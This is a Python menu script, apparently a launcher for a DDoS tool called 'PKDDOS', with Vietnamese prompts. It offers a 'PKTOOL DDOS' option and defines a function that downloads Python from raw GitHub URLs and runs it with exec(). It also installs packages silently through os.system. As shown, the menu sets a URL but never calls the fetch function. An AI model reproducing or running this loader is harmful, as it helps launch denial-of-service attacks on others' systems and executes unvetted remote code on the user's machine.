import os
import sys
import re
import json
import random
from time import sleep
import threading
import requests
from time import strftime

try:
    import requests
    import pystyle
except ImportError:
    os.system('pip install requests && pip install bs4 && pip install pystyle && pip install clear && pip install strftime')

def banner():
    print(''' 
[38;2;255;0;255m''')

def ra(a):
    for i in range(len(a)):
        sys.stdout.write(a[i])
        sys.stdout.flush()
    print()

def get_code_from_github(url):
    response = requests.get(url)

    if response.status_code == 200:
        code = response.text
        exec(code)
    else:
        print("Không thể lấy mã từ URL:", url)

def main():
    from pystyle import Box
    os.system('clear')
    banner()
    a = "\033[1;91m=\033[1;97m=" * 30
    for i in range(len(a)):
        sys.stdout.write(a[i])
        sys.stdout.flush()
        sleep(0.001)
    print()
    print("- - - - - - - - - - - PKDDOS NTTP - - - - - - - - - - - - -")
    print()
    print("\033[1;91m『\033[1;97m亗\033[1;91m』\033[1;97m▶▶\033[1;92m Nhập [1] PKTOOL DDOS")
    print("\033[1;91m『\033[1;97m亗\033[1;91m』\033[1;97m▶▶\033[1;92m Nhập [2] PKTOOL COMING SOON")
    print("\033[1;91m『\033[1;97m亗\033[1;91m』\033[1;97m▶▶\033[1;92m Nhập [3] Lấy mã từ GitHub")
    print("\033[1;91m『\033[1;97m亗\033[1;91m』\033[1;97m▶▶\033[1;92m Nhập [4] Thoát")
    print()
    a = "\033[1;91m=\033[1;97m=" * 30
    for i in range(len(a)):
        sys.stdout.write(a[i])
        sys.stdout.flush()
        sleep(0.001)
    print()
    choice = input("\033[1;91m『\033[1;97m亗\033[1;91m』\033[1;97m▶▶\033[1;92m Nhập Số : ")
    a = "\033[1;91m=\033[1;97m=" * 30
    for i in range(len(a)):
        sys.stdout.write(a[i])
        sys.stdout.flush()
        sleep(0.001)
    print()

    if choice == "1":
        url = "https://raw.githubusercontent.com/Kenne400k/nxt/main/pk.py"
    elif choice == "2":
        url = "https://raw.githubusercontent.com/Kenne400k/nxt/main/pk1.go"
    elif choice == "3":
        url = "https://raw.githubusercontent.com/Kenne400k/nxt/main/getkey.py"
    elif choice == "4":
        sys.exit("Đã thoát")
    else:
        print("Lựa chọn không hợp lệ. Vui lòng chọn lại.")

if __name__ == "__main__":
    main()
